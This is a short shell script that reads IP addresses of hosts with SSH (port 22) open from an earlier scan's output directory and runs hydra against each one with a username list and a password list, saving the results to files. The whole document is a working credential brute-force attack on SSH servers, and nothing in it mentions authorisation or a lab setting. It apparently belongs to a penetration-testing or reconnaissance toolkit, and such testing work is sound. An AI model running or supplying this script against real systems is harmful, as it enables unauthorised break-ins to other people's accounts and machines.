for ip in $(ls -R ../../out | grep /tcp-22 | cut -d "/" -f 4)
do
	hydra -L user_list.txt -P password_list.txt $ip ssh | tee out/$ip.ssh.results 
	wait

done
